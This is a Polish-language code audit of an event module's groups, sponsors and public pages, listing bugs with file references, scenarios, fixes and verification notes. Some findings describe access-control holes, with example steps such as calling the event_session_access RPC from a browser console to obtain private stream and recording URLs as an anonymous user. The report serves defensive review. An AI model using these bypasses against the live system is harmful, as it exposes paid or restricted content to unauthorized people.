**Weryfikacja.** Kod potwierdza mechanizm, choc podane numery linii nie zgadzaja sie z plikami. Pole tematu: src/components/events/meetings/MeetingInviteDialog.tsx:125-131 (tylko maxLength=200) i :151-155 (`topic: topic.trim() === "" ? null : topic.trim()`) - zero dolnego progu. CHECK: supabase/migrations/20260823190000_event_meetings.sql:781-782 `event_meetings_topic_len ... BETWEEN 2 AND 200`. RPC nie sanityzuje - :4062 wstawia […]

---

## Grupy i sponsorzy

> Grupy stoja na `event_groups` (siedem kolumn-uprawnien) z czterema grupami zaseedowanymi triggerem (`_event_seed_default_groups`, 20260823150000:1149) i grupami dodatkowymi w `event_group_members`. CRUD dziala end-to-end przez `admin_event_groups_list/_group_upsert/_delete/_member_set` (20260824091615) za bramka `assert_editor_tenant()`, a RLS calego modulu jest zawezone do admina (20260825170000) i pilnowane kontraktem pgTAP. Sponsorzy sa zbudowani zgodnie z decyzja par. 0.4: `event_sponsors.company_id` wskazuje `crm_companies` (FK NO ACTION - firmy uzytej jako sponsor nie da sie skasowac w CRM), a na strone idzie MIGAWKA (`snapshot_*`), nie kartoteka, z wyliczanym rozjazdem `crm_drift` i odswiezaniem. Postulowanej w par. 9 (ryzyko 2) funkcji `event_capabilities()` NIE MA w repozytorium w ogole - de facto zastepuje ja `_event_meeting_groups()` (20260825062957:2), ale to pomocnik gieldy spotkan, a sama regula "czy grupa moze X" jest przepisana inline w co najmniej czterech funkcjach; trzy z siedmiu uprawnien (`can_chat`, `can_see_recording`, `min_tier_rank`) nie sa czytane nigdzie. […]

### [KRYTYCZNY] Edycja sponsora bezgloosnie kasuje notatke wewnetrzna (utrata danych)

`src/lib/events/sponsorDraft.ts:266` · blad · weryfikacja: POTWIERDZONE

`sponsorDraftFromRow` czyta `row.internal_note` (linia 266), ale dialog dostaje wiersz z `admin_event_sponsors_list`, ktory tej kolumny NIE ZWRACA (RETURNS TABLE w supabase/migrations/20260823160000_event_sponsors_companies.sql:1252-1294 konczy sie na `total_count`, bez `internal_note`; notatka jest wylacznie w `admin_event_sponsor_detail`, migracja:1422). `textOf(undefined)` daje pusty napis, a `sponsorDraftToInput` zawsze wpisuje do payloadu `internalNote: trimOrNull(draft.internalNote)` = `null` (linia 311). `payload()` w src/lib/events/sponsorsApi.ts:64-70 odrzuca tylko `undefined`, wiec klucz `internal_note` JEST w payloadzie, a RPC ma `internal_note = CASE WHEN p_payload ? 'internal_note' THEN ... END` (migracja:1771-1775) i ustawia NULL. src/components/admin/events/organisms/SponsorsListPanel.tsx:331 przekazuje do dialogu wiersz LISTY (`setEdited(row)`), nie szczegol.

**Scenariusz.** Handlowiec zapisuje przy sponsorze notatke 'umowa NES/2026/114, faktura po wydarzeniu'. Tydzien pozniej ktokolwiek otwiera olowek przy tym sponsorze, zmienia tylko numer stoiska i klika Zapisz -> `internal_note` w bazie staje sie NULL. Nie ma toasta, nie ma ostrzezenia, notatki nie da sie odtworzyc.

**Naprawa.** Albo dolozyc `internal_note` do RETURNS TABLE i SELECT-a `admin_event_sponsors_list`, albo (lepiej) w `EventSponsorDialog` przy edycji czytac `useSponsorDetail(sponsor.id)` i budowac szkic z detalu. Dodatkowo w `sponsorDraftToInput` zwracac `internalNote: undefined`, gdy szkic nie zostal zbudowany ze zrodla znajacego to pole.

**Weryfikacja.** Sprawdzone w calosci lancucha. `admin_event_sponsors_list` w RETURNS TABLE konczy sie na `total_count` i nie ma `internal_note` (supabase/migrations/20260823160000_event_sponsors_companies.sql:1262-1296), a jego SELECT tez jej nie wybiera (tamze:1310-1327); komentarz przy `admin_event_sponsor_detail` wprost mowi, ze notatka jest odcieta od listy (tamze:1394-1398). Dialog dostaje wiersz LISTY: `setEdited(row)` w […]

### [wysoki] event_audience_grants: predykat ignoruje event_id nadania i nadania dla osob bez konta; brak listy i brak ekranu

`supabase/migrations/20260825191948_ab7f57aa-961d-436a-ba0f-2fd114f42844.sql:566` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`event_audience_qualifies(text)` sprawdza wylacznie `g.user_id = v_uid` i nie porownuje `g.event_id` z zadnym wydarzeniem (linie 566-576) - funkcja w ogole nie przyjmuje identyfikatora wydarzenia. Tymczasem tabela ma kolumne `event_id` z komentarzem 'nadanie jest najemcy; event_id zawezaja tylko nadania celowo jednorazowe' (linia 147-148) oraz `person_id` z CHECK-iem `(user_id IS NOT NULL) <> (person_id IS NOT NULL)` (linia 86), a `admin_event_audience_grant_save` pozwala zapisac oba warianty (linie 1244-1263). Nadan po `person_id` nie czyta nic. Do tego nie istnieje zadne `admin_event_audience_grants_list` (grep w supabase/migrations: brak), a w src/ nazwa pojawia sie wylacznie w src/integrations/supabase/types.ts:19617-19621 - zaden komponent nie wola tych RPC.

**Scenariusz.** Administrator nadaje profesorowi stawke 'academic' jednorazowo dla kongresu A (`event_id` = A, dowod 'legitymacja UW'). Ta sama osoba rejestruje sie na platne wydarzenie B - `event_audience_qualifies('academic')` znajduje aktywne nadanie i przepuszcza stawke ulgowa na B. Drugi wariant: nadanie dla osoby z kartoteki (`person_id`) nie dziala nigdy, wiec uczestnik bez konta nigdy nie kupi wejsciowki […]

**Naprawa.** Rozszerzyc podpis do `event_audience_qualifies(p_audience text, p_event_id uuid)` i dolozyc `AND (g.event_id IS NULL OR g.event_id = p_event_id)`; dolozyc galaz dopasowujaca `g.person_id` do kartoteki wolajacego (po `event_people.user_id`). Dopisac `admin_event_audience_grants_list` i ekran nadan w studiu (sekcja Zapisy -> Wejsciowki), inaczej `requires_verification` nie ma jak zadzialac.

**Weryfikacja.** Wszystkie trzy czesci potwierdzone w kodzie. `event_audience_qualifies(p_audience text)` nie przyjmuje wydarzenia i w EXISTS porownuje tylko `tenant_id`, `audience`, `user_id`, okno waznosci i `revoked_at` - `g.event_id` i `g.person_id` nie wystepuja (supabase/migrations/20260825191948:566-576). Tabela ma jednak `event_id` z FK do events i CHECK `(user_id IS NOT NULL) <> (person_id IS NOT NULL)` (tamze:76,86-87), a […]

### [średni] 'Widzi liste uczestnikow' i zasieg widocznosci dzialaja wylacznie w gieldzie spotkan, publiczna zakladka Uczestnicy je ignoruje

`supabase/migrations/20260826182500_event_attendees_and_discussions.sql:34` · niespojnosc · weryfikacja: POTWIERDZONE

`event_attendees` ma w naglowku wprost: 'CZEGO TA FUNKCJA CELOWO NIE CZYTA: (...) ani `event_groups.attendee_visibility` (te kolumny opisuja widocznosc W GIELDZIE (...)). Grupy wychodza jako ETYKIETY i licznik, nie jako bramka' (linie 34-38). Jedynym konsumentem `can_see_attendees` / `attendee_visibility` jest `_event_meeting_directory_scope` (supabase/migrations/20260825223630_cc39dcc5-1006-4ead-b413-ee379eba7fd7.sql:22-45). W panelu nic tego nie zawezaa: EventGroupDialog.tsx:268-281 nazywa pole po prostu 'Widzi liste uczestnikow' + 'Zasieg listy uczestnikow' (src/lib/i18n-admin-event-terms.ts:84-85), a EventGroupsPanel.tsx:163-165 pokazuje ten zasieg jako etykiete grupy.

**Scenariusz.** Wydarzenie w regule Chatham House: organizator ustawia wszystkim grupom `can_see_attendees = false` (zasieg 'none'), spodziewajac sie, ze nikt nie zobaczy listy nazwisk. Zakladka `/events/<slug>/participants` nadal pokazuje pelna liste zapisanych z profilem `discoverable` (event_attendees, 20260826182500:100-125), bo bramkuje ja tylko `directory_opt_out` i `profiles.discoverable`.

**Naprawa.** Albo wpiac `_event_meeting_directory_scope` do `event_attendees` (z jawnym domyslnym rozluznieniem, zeby nie wygasic listy wszystkim), albo przemianowac pola w panelu na 'Widocznosc w gieldzie spotkan' i dopisac hint, ze pole nie dotyczy zakladki Uczestnicy. Docelowo - jedna `event_capabilities()` z p. wyzej.

**Weryfikacja.** Fakty sie zgadzaja. Jedynym konsumentem obu kolumn jest `_event_meeting_directory_scope` (supabase/migrations/20260825223630:22-45, wczesniej 20260825200000:79-99) - potwierdzone greppem `can_see_attendees|attendee_visibility` po supabase/migrations i src/. ZYWA definicja `event_attendees` to 20260828105751:26-200 (nie 20260826182500, ktora finding cytuje jako zrodlo wierszy) i tam bramkami sa wylacznie: `r.status […]

### [średni] Brak funkcji event_capabilities(); regula uprawnien grupy powielona w czterech miejscach, a trzy uprawnienia sa martwe

`src/components/admin/events/molecules/EventGroupDialog.tsx:267` · niespojnosc · weryfikacja: POTWIERDZONE

Par. 9 ryzyko 2 mitygowal rozjazd widocznosci 'jedna funkcja event_capabilities(), kazdy RPC ja wola'. `rg -n "event_capabilities"` w calym repozytorium nie zwraca ani jednego trafienia. Rozwiazanie grup do zbioru id-kow jest scentralizowane (`_event_meeting_groups`, supabase/migrations/20260825062957_3c0d935f-9c1e-43d9-affc-c4803f444423.sql:2-39), ale sam predykat zdolnosci jest kopiowany inline: `WHERE g.can_meet` w 20260825062957:170-190 (dwa razy), 20260825064710_8ffed332:200-206, 20260825223630_cc39dcc5:254, 20260828131628_c9408e42:208; `WHERE g.can_lead_retrieval` w 20260825062957:218-226. Rownoczesnie `can_chat`, `can_see_recording` i `min_tier_rank` grupy nie sa czytane przez ZADEN predykat - wystepuja tylko w definicji tabeli (20260823150000:326-330), w RETURNS listy i w UPDATE upsertu (20260824091615:15-18,136-141). Sekcja 'Uprawnienia' dialogu (EventGroupDialog.tsx:267-307) pokazuje je jako rownorzedne przelaczniki, a slownik obiecuje 'Moze pisac wiadomosci' / 'Widzi […]

**Scenariusz.** Organizator wylacza grupie 'Partnerzy' przelacznik 'Widzi nagrania' i 'Moze pisac wiadomosci', po czym publikuje wydarzenie w przekonaniu, ze partnerzy nie zobacza nagrania i nie napisza na czacie. Zaden RPC tych kolumn nie sprawdza - partnerzy widza nagranie i pisza jak wszyscy. Odwrotnie: dolozenie piatego miejsca sprawdzajacego `can_meet` bez aktualizacji pozostalych czterech da dwa rozne zdania o tej samej […]

**Naprawa.** Dodac `public.event_capabilities(_tenant, _event_id, _registration_id)` zwracajaca rekord wszystkich zdolnosci (suma po grupach z `_event_meeting_groups`) i przepisac na nia szesc miejsc wymienionych wyzej. Do czasu podpiecia `can_chat`, `can_see_recording` i `min_tier_rank` do realnych bramek - usunac te trzy pola z dialogu albo oznaczyc je w slowniku jako nieaktywne.

**Weryfikacja.** `event_capabilities` nie wystepuje w zadnym pliku .sql ani .ts - tylko w docs/ (grep po repo). Predykat `can_meet` jest realnie kopiowany inline w zywych migracjach: 20260825062957:174 i :185, 20260825064710:203, 20260825223630:254, 20260828131628_c9408e42:208 (plus starsze, nadpisane 20260823190000:1366 i 20260825200000:330). `can_lead_retrieval` jako predykat tylko w 20260823190000:1420. Potwierdzam martwe […]

### [średni] Kazdy zapis sponsora z panelu ustawia snapshot_source='manual' - przycisk 'Odswiez migawki' nigdy nic nie odswieza

`src/lib/events/sponsorDraft.ts:305` · blad · weryfikacja: POTWIERDZONE

RPC uznaje migawke za reczna, gdy w payloadzie JEST ktorykolwiek z czterech kluczy kartotecznych: `v_manual boolean := (p_payload ? 'snapshot_name' OR p_payload ? 'snapshot_logo_url' OR p_payload ? 'snapshot_website' OR p_payload ? 'snapshot_country')` (supabase/migrations/20260823160000_event_sponsors_companies.sql:1571-1576), po czym `snapshot_source = CASE WHEN v_manual THEN 'manual' ...` (migracja:1769). Tymczasem `sponsorDraftToInput` zawsze zwraca `snapshotName: draft.snapshotName.trim()` (305) oraz `snapshotLogoUrl/Website/Country: trimOrNull(...)` (306-308) - nigdy `undefined` - a dialog dodatkowo prefilluje te pola z wybranej firmy CRM (src/components/admin/events/molecules/EventSponsorDialog.tsx:177-183). `admin_event_sponsor_snapshot_refresh` domyslnie pomija `manual`: `AND (v_include_manual OR s.snapshot_source = 'crm')` (migracja:2039).

**Scenariusz.** Redaktor przypina firme 'Alfa' z CRM, akceptuje podpowiedziane nazwe i logotyp, zapisuje -> wiersz od razu ma snapshot_source='manual'. Miesiac pozniej firma zmienia w CRM nazwe na 'Alfa Group'. Panel pokazuje czerwona plakietke 'rozjazd z CRM'. Redaktor klika 'Odswiez migawki' -> toast 'odswiezono 0'. Rozjazd zostaje, a jedyne wyjscie (zaznaczyc wiersze i kliknac 'uwzglednij reczne') nie wynika z niczego na ekranie.

**Naprawa.** W `sponsorDraftToInput` przekazywac pola migawkowe tylko wtedy, gdy realnie roznia sie od stanu zapisanego (porownanie z wierszem zrodlowym), a przy tworzeniu w ogole nie wysylac wartosci przepisanych z wybranej firmy - RPC sam je uzupelni z `crm_companies` (migracja:1645-1662). Alternatywnie dodac do payloadu jawna flage `snapshot_manual` zamiast wnioskowania po obecnosci kluczy.

**Weryfikacja.** Kod zgadza sie z opisem: `v_manual` jest liczone z SAMEJ OBECNOSCI kluczy (supabase/migrations/20260823160000_event_sponsors_companies.sql:1571-1576), `snapshot_source = CASE WHEN v_manual THEN 'manual'` (tamze:1769), a klient zawsze wysyla `snapshot_name`/`snapshot_logo_url`/`snapshot_website`/`snapshot_country` (src/lib/events/sponsorDraft.ts:305-308 + sponsorsApi.ts:64-70,232-240) - `payload()` usuwa tylko […]

### [średni] Osoby kontaktowe sponsora: tabela, RPC, hook i licznik w UI - i ani jednego ekranu do ich edycji

`src/components/admin/events/organisms/SponsorsListPanel.tsx:306` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Wiersz sponsora pokazuje plakietke `Kontakty: N` (linie 306-308) czytana z `contacts_count` liczonego w `admin_event_sponsors_list` (supabase/migrations/20260823160000_event_sponsors_companies.sql:1350-1354). Zaplecze jest kompletne: tabela `event_sponsor_contacts` (migracja:677-742), RPC `admin_event_sponsor_contacts_set` (2191-2278), funkcja API `setSponsorContacts` (src/lib/events/sponsorsApi.ts:302-321), hook `useSetSponsorContacts` (src/lib/events/useEventSponsors.ts:150-155) i `contacts jsonb` w `admin_event_sponsor_detail` (migracja:1431). `grep -rn useSetSponsorContacts src/` poza definicja hooka nie daje ani jednego trafienia - rozwijany panel przy sponsorze montuje wylacznie `SponsorMaterialsPanel` (SponsorsListPanel.tsx:349).

**Scenariusz.** Organizator widzi przy kazdym sponsorze 'Kontakty: 0' i nie ma z tej informacji nic - nie da sie dodac osoby decyzyjnej ani kontaktu rozliczeniowego, bo w calym panelu nie ma na to ani jednego pola. Licznik jest wiec trwale zerowy i sugeruje brak danych zamiast braku ekranu.

**Naprawa.** Dolozyc zakladke 'Kontakty' obok 'Materialow' w rozwinieciu wiersza sponsora, oparta o `admin_event_sponsor_detail.contacts` + `useSetSponsorContacts` i wyszukiwarke `crm_leads`. Do czasu wdrozenia - ukryc plakietke kontaktow, zeby nie obiecywala danych bez sciezki wejscia.

**Weryfikacja.** Potwierdzone po obu stronach. Licznik `Kontakty: N` jest rysowany w src/components/admin/events/organisms/SponsorsListPanel.tsx:305-308 z `contacts_count` liczonego w LATERAL-u listy (supabase/migrations/20260823160000:1350-1354). Zaplecze kompletne: `setSponsorContacts` (src/lib/events/sponsorsApi.ts:302-321) i `useSetSponsorContacts` (src/lib/events/useEventSponsors.ts:150-155). `grep -rn […]

### [średni] Przelacznik 'wyroznione swiadczenie' zapisuje pole, ktorego nie ma w bazie

`src/components/admin/events/molecules/EventSponsorTierDialog.tsx:224` · blad · weryfikacja: POTWIERDZONE

Dialog poziomu ma per-swiadczenie przelacznik `checked={benefit.isHighlighted}` (linia 224), szkic go trzyma (src/lib/events/sponsorDraft.ts:75-79, 196-200), a API wysyla `is_highlighted: b.isHighlighted ?? false` (src/lib/events/sponsorsApi.ts:121-125). W bazie tej kolumny nie ma: `event_sponsor_tier_benefits` to `label_pl`, `label_en`, `sort_order` (supabase/migrations/20260823160000_event_sponsors_companies.sql:369-389), INSERT w `admin_event_sponsor_tier_save` wstawia tylko te trzy pola (migracja:1058-1073), a `admin_event_sponsor_tiers_list` buduje JSON bez tego klucza (migracja:922-931). Do tego `SponsorTiersPanel.toggleActive` (linie 66-69) odsyla przy kazdym przelaczeniu 'aktywny' cala liste swiadczen, wiec pelna podmiana (DELETE+INSERT, migracja:1053-1073) wykonuje sie takze wtedy, gdy swiadczen nikt nie dotykal - i nadaje im nowe identyfikatory.

**Scenariusz.** Redaktor zaznacza w poziomie 'Diamond' dwa swiadczenia jako wyroznione i zapisuje. Po ponownym otwarciu dialogu oba przelaczniki sa wylaczone (benefitsFromJson w sponsorDraft.ts:116-129 czyta nieistniejacy klucz), a na stronie publicznej wyroznienia nie ma nigdzie, bo `event_sponsors_public` tez zwraca tylko id/label_pl/label_en (migracja:2551-2560).

**Naprawa.** Dolozyc kolumne `is_highlighted boolean NOT NULL DEFAULT false` do `event_sponsor_tier_benefits`, obsluzyc ja w INSERT-cie `admin_event_sponsor_tier_save`, w `admin_event_sponsor_tiers_list` i w `event_sponsors_public` - albo usunac przelacznik z dialogu. Przy okazji: `toggleActive` powinien wysylac `{ id, isActive }` bez `benefits`, zeby nie wywolywac pelnej podmiany listy.

**Weryfikacja.** `grep -rn is_highlighted supabase/migrations` nie zwraca ANI JEDNEGO trafienia. Tabela `event_sponsor_tier_benefits` ma tylko `label_pl`, `label_en`, `sort_order` (supabase/migrations/20260823160000:369-389), INSERT w `admin_event_sponsor_tier_save` wymienia te same trzy kolumny (tamze:1073-1078), a `admin_event_sponsor_tiers_list` buduje JSON z `id/label_pl/label_en/sort_order` (tamze:924-931); […]

### [średni] Widocznosc podstrony per grupa filtruje tylko menu; strona modulowa i dane sponsorow zostaja osiagalne pod adresem

`supabase/migrations/20260826181500_event_default_module_pages.sql:925` · bezpieczenstwo · weryfikacja: POTWIERDZONE

`event_menu` egzekwuje `cardinality(ep.visible_to_groups) = 0 OR ep.visible_to_groups && v_groups` (linie 925-929) - i to jedyne miejsce, gdzie ta kolumna jest czytana (grep `visible_to_groups` po supabase/migrations i src/). Panel pozwala ja ustawic dla KAZDEJ pozycji, takze modulowej (src/components/admin/events/molecules/EventPageEntrySheet.tsx:193-206). Tymczasem `EventModulePage` pisze wprost: 'Strona modulowa moze byc (...) widoczna tylko dla wybranych grup - wtedy `event_menu` jej nie odda i wstepu po prostu nie ma. Dane pod spodem (...) maja wlasne zrodlo i wlasne bramki' (src/components/events/public/molecules/EventModulePage.tsx:26-31). Dla partnerow tych 'wlasnych bramek' nie ma: `event_sponsors_public(text)` i `event_sponsor_materials_public(text)` maja GRANT dla `anon` i sprawdzaja wylacznie `e.status = 'published'` (supabase/migrations/20260823160000_event_sponsors_companies.sql:2477-2571, 2590-2648), a trasa `/events/$slug/partners` renderuje liste bezwarunkowo […]

**Scenariusz.** Organizator ogranicza pozycje menu 'Partnerzy' do grupy 'Organizatorzy', zeby przed ogloszeniem sponsorow nie pokazywac ich publicznie. Pozycja znika z paska, ale kazdy - takze niezalogowany - wchodzi na /events/<slug>/partners i widzi pelna liste logotypow, albo wola supabase.rpc('event_sponsors_public', {p_slug}) z konsoli i dostaje ja z materialami wlacznie.

**Naprawa.** Przeniesc bramke grupowa do zrodel danych: `event_sponsors_public` / `event_sponsor_materials_public` powinny czytac `event_pages.visible_to_groups` dla swojego modulu i `_event_meeting_groups` wolajacego (wzorzec juz jest w `event_attendees`). Do czasu wdrozenia - w `EventPageEntrySheet` blokowac checklisty grup dla pozycji modulowych i napisac w hincie, ze pole ukrywa wylacznie pozycje menu.

**Weryfikacja.** Zachowanie jest dokladnie takie, jak opisano. `visible_to_groups` czytane jest wylacznie w `event_menu` (20260826181500:927-928 i identycznie w 20260827065451:927-928; greppy po supabase/migrations i src/ nie daja innego konsumenta). `EventModulePage` renderuje `children` bezwarunkowo - brak wpisu w menu gasi tylko wstep z CMS-a (src/components/events/public/molecules/EventModulePage.tsx:92-95), a trasa montuje […]

### [średni] Zdjecie flagi grupy domyslnej jest przyjmowane bez sprzeciwu - kolejne zapisy dostaja group_id = NULL

`supabase/migrations/20260824091615_491fb079-e22a-4e48-aee5-694804804b38.sql:143` · blad · weryfikacja: POTWIERDZONE

`admin_event_group_upsert` ustawia `is_default = COALESCE(v_is_default, g.is_default)` (linia 143), a `v_is_default` bierze wprost z payloadu (linia 93). `groupDraftToInput` zawsze wysyla `isDefault: draft.isDefault` (src/lib/events/termsGroupsDraft.ts:172), wiec przelaczenie switcha 'Grupa domyslna' na off (EventGroupDialog.tsx:302-307) faktycznie zdejmuje flage. Nie ma zadnego warunku 'musi zostac dokladnie jedna' - indeks `event_groups_default_uniq` (20260823150000:368-369) pilnuje tylko gornej granicy. `event_register` przy braku biletu robi `SELECT g.id INTO v_group_id (...) WHERE g.is_default` i przy pustce zostawia NULL (supabase/migrations/20260827220945_d4ece1f0-ffc7-43aa-a5b0-a04c95760ae7.sql:369-373), po czym wpisuje ten NULL do zapisu (linia 526).

**Scenariusz.** Organizator otwiera grupe 'Uczestnicy', chce zmienic tylko opis, przy okazji klika przelacznik 'Grupa domyslna' zeby zobaczyc, co robi, i zapisuje. Wydarzenie nie ma juz grupy domyslnej. Kazdy kolejny zapis RSVP dostaje `group_id = NULL`, `_event_meeting_groups` zwraca dla niego pusty zbior (20260825062957:12-39), wiec taki uczestnik nie widzi katalogu, nie moze zapraszac na spotkania i nie ma etykiety grupy na […]

**Naprawa.** W `admin_event_group_upsert` po UPDATE sprawdzic `EXISTS (... WHERE is_default)` w obrebie wydarzenia i przy pustce podniesc `group_default_required`, albo automatycznie przywrocic flage grupie systemowej `attendees`. Rownolegle: w `EventGroupsPanel` pokazac ostrzezenie, gdy zadna grupa nie jest domyslna.

**Weryfikacja.** Zywy upsert to supabase/migrations/20260824091615:80-183: `v_is_default` bierze sie wprost z payloadu (linia 93), zerowanie poprzedniej robi sie tylko przy `IS TRUE` (linie 111-119), a przypisanie `is_default = COALESCE(v_is_default, g.is_default)` (linia 143) przyjmuje jawne `false`. Indeks `event_groups_default_uniq` jest czesciowy i pilnuje tylko gornej granicy (20260823150000:368-369); zadnego triggera na […]

### [niski] Kryterium odbioru E6 'reklama wydarzenia celowana w grupe' nie ma zadnego oparcia w kodzie

`src/lib/ads/types.ts:113` · luka-funkcjonalna · weryfikacja: PRAWDOPODOBNE

Etap E6 w docs/PROJEKT_MODUL_EVENT_BUILDER_2026-08-23.md:865 wymaga 'rozszerzenie AdTargeting/AdPosition o wydarzenie i grupy' oraz w kryterium odbioru 'reklama wydarzenia celowana w grupe, z odslonami i klikami z ad_events'. `AdTargeting` ma wylacznie `categorySlugs`, `tagSlugs` i `languages` (linie 113-117), `AdTargetingContext` odpowiednio `categorySlugs`, `tagSlugs`, `language` (119-123), a `matchesAdTargeting` (158-168) nie zna ani wydarzenia, ani grupy. `parseAdTargeting` (132-143) odrzuca wszystko poza tymi trzema kluczami, wiec nawet reczne dopisanie `eventId` do jsonb nie przetrwa odczytu.

**Scenariusz.** Sprzedaz sprzedaje sponsorowi pakiet 'baner widoczny dla uczestnikow kongresu, tylko dla grupy Uczestnicy'. Nie ma czym tego ustawic: slot mozna zawezic do kategorii i tagow tresci, a nie do wydarzenia i grupy. Reklama emituje sie wszystkim albo wcale, a raport z `ad_events` nie da sie rozbic per wydarzenie.

**Naprawa.** Rozszerzyc `AdTargeting` o `eventIds?: string[]` i `eventGroupIds?: string[]`, dolozyc je do `parseAdTargeting`/`adTargetingToJson`/`matchesAdTargeting`, a kontekst emisji na stronie wydarzenia zasilic z `event_menu`/`_event_meeting_groups` wolajacego. Bez tego etap E6 nie ma jak zostac odebrany.

**Weryfikacja.** Polowa ustalenia jest nietrafna. Prawda jest, ze `AdTargeting` ma tylko `categorySlugs`/`tagSlugs`/`languages`, `parseAdTargeting` odsiewa reszte, a `matchesAdTargeting` nie zna grup (src/lib/ads/types.ts:113-123, 132-143, 158-168) - wymiar GRUPY faktycznie nie istnieje. Ale wymiar WYDARZENIA jest wdrozony inna droga, ktorej finding nie sprawdzil: `ALTER TYPE public.ad_page_type ADD VALUE 'event'` […]

### [niski] Trzy RPC zmiany kolejnosci sponsorow, poziomow i materialow nie maja ani jednego konsumenta

`src/lib/events/useEventSponsors.ts:124` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

`useReorderSponsorTiers` (linia 124), `useReorderSponsors` (136) i `useReorderSponsorMaterials` (165) nie sa importowane w zadnym komponencie ani trasie (`grep -rn` po src/ poza plikiem definicji: zero trafien). Za nimi stoi komplet: `reorderSponsorTiers/reorderSponsors/reorderSponsorMaterials` (src/lib/events/sponsorsApi.ts:144,256,357) oraz trzy wsadowe RPC (supabase/migrations/20260823160000_event_sponsors_companies.sql:1150-1189, 1844-1879, 2403-2438). Kolejnosc na wszystkich trzech ekranach ustawia sie wylacznie recznie wpisana liczba w polu `sort_order` (EventSponsorDialog.tsx:253-259, EventSponsorTierDialog, SponsorMaterialDialog.tsx:103-109), a `nextSortOrder` w SponsorsListPanel.tsx:88 liczy sie tylko z biezacej STRONY wynikow, wiec przy stronicowaniu potrafi wygenerowac duplikat.

**Scenariusz.** Sprzedaz chce przestawic 'Silver' nad 'Bronze'. Jedyna droga to otwarcie obu poziomow i recznie przeliczenie pol 'kolejnosc' i 'ranga'. Przy dwudziestu sponsorach na czterech stronach listy nowy sponsor dodany na stronie 2 dostaje `sort_order` liczony z tej strony i laduje w srodku listy zamiast na koncu.

**Naprawa.** Podpiac przeciaganie wierszy (albo choc strzalki gora/dol) w SponsorTiersPanel, SponsorsListPanel i SponsorMaterialsPanel do istniejacych hookow reorder. `nextSortOrder` liczyc z `total_count` albo z osobnego zapytania o maksimum, nie z biezacej strony.

**Weryfikacja.** `grep -rn "useReorderSponsorTiers|useReorderSponsors|useReorderSponsorMaterials" src` z pominieciem pliku definicji nie daje ani jednego trafienia; hooki stoja w src/lib/events/useEventSponsors.ts:124,136,165, funkcje API w src/lib/events/sponsorsApi.ts:144,256,357, a RPC w supabase/migrations/20260823160000:1150-1189, 1844-1879 i 20260824094504:100-150. Potwierdzam tez `nextSortOrder` liczony z biezacej strony […]

---

## Front publiczny

> Publiczna powierzchnia wydarzenia jest zbudowana poprawnie warstwowo: powłoka `events.$slug.tsx` daje branding, powrót i pasek zakładek z `event_menu` (już przefiltrowany po grupach zapisu), a pięć zakładek modułowych (`participants`, `speakers`, `partners`, `agenda`, `discussions`) renderuje dokument CMS z `pages` plus organizm z danymi. Katalog uczestników jest solidny - stoi na dwóch istniejących zgodach (`profiles.discoverable` + `event_registrations.directory_opt_out`), ma REVOKE dla `anon`, a Chatham House odbiera nazwiska w SQL (jedna linia `WHERE NOT v_chatham`), nie w komponencie. Dyskusje to zajawka grupy klubu z `club_capabilities` jako jedynym źródłem dostępu. Ryzyko nr 3 z §9 NIE zostało jednak w pełni domknięte: `events.join_url`/`recording_url` faktycznie są odcięte grantem kolumnowym i `get_event_access` je bramkuje, ale poziom SESJI powtarza dokładnie ten błąd, który naprawiła migracja 20260721150000 - `event_session_access` oddaje `recording_url` bezwarunkowo (także anonimowi), a `stream_url` każdemu, gdy sesja nie wymaga zapisu, i nie patrzy ani na […]

### [KRYTYCZNY] event_session_access oddaje recording_url i stream_url anonimowemu - powtórka błędu naprawionego w 20260721150000

`supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:805` · bezpieczenstwo · weryfikacja: POTWIERDZONE

Funkcja ma `GRANT EXECUTE ... TO anon`, a jej ciało bramkuje wyłącznie `min_tier_rank` SESJI: `IF v_session.min_tier_rank > 0 AND NOT public.has_tier_rank(...)`. Domyślna wartość tej kolumny to 0, więc dla większości sesji bramki nie ma żadnej. Dalej: `v_signed := NOT v_session.requires_signup OR EXISTS (... user_id = v_uid ...)` - przy `requires_signup = false` `v_signed` jest prawdą także dla `auth.uid() IS NULL`, więc zwrot `'stream_url', CASE WHEN v_signed THEN v_session.stream_url END` wydaje adres transmisji gościowi. Linia niżej `'recording_url', v_session.recording_url` nie ma żadnego `CASE` w ogóle. Funkcja nie czyta ANI RAZU `events.visibility`, `events.min_tier_rank`, `events.chatham_house` ani `event_sessions.is_private` (SELECT filtruje tylko `s.status='published' AND e.status='published'`). Dokładnie ten wzorzec - „get_event_access oddawał recording_url każdemu, kto przeszedł próg" - był treścią naprawy w 20260721150000:22, gdzie nagranie schowano za […]

**Scenariusz.** Wydarzenie `visibility='members'`, `min_tier_rank=3`, sesja plenarna z `requires_signup=false`, `min_tier_rank=0` i wypełnionym `stream_url`. Niezalogowany wywołuje z konsoli `supabase.rpc('event_session_access',{_session_id:'<uuid sesji>'})` - identyfikator sesji jest jawny, bo `event_agenda` (GRANT dla anon) oddaje `id` każdej sesji po slugu wydarzenia. Odpowiedź zawiera `stream_url` i `recording_url`. Wejściówka […]

**Naprawa.** Dołożyć w `event_session_access` bramkę wydarzenia rodzica (ta sama drabinka co w `get_event_access`: `visibility='members'` -> `has_tier_rank(GREATEST(min_tier_rank,1))`, `chatham_house` -> `has_tier_feature('chatham_house_events')`), wymóg `auth.uid() IS NOT NULL` dla obu adresów, `recording_url` za `has_tier_feature('recordings')`, oraz `AND s.is_private = false` w SELECT-cie (albo dopuszczenie prywatnej sesji […]

**Weryfikacja.** Sprawdziłem ciało funkcji w supabase/migrations/20260824084741_5e079502-9770-4b2f-a8cd-5e9a4535d64e.sql:759-816. SELECT (linie 774-784) filtruje wyłącznie s.status='published' AND e.status='published' - ani events.visibility, ani events.min_tier_rank, ani s.is_private. Jedyna bramka to `IF v_session.min_tier_rank > 0 AND NOT has_tier_rank(...)` (:790), a kolumna ma DEFAULT 0 (20260823140000_event_sessions.sql:454), […]

### [wysoki] Strona wydarzenia nie ma loadera - zero SSR, JSON-LD Event nigdy nie trafia do HTML z serwera

`src/routes/events.$slug.index.tsx:253` · blad · weryfikacja: POTWIERDZONE

